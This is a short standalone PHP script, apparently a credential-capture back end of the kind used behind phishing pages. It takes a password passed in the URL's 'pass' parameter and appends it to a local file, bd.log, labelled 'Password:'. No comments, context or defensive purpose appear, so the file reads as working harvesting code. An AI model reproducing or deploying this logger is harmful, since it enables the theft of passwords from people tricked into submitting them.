<?php
$pass = $_GET['pass'];
$f = fopen("bd.log", "a+");
fwrite($f, "\r\nPassword: $pass");
fclose($f);
?>
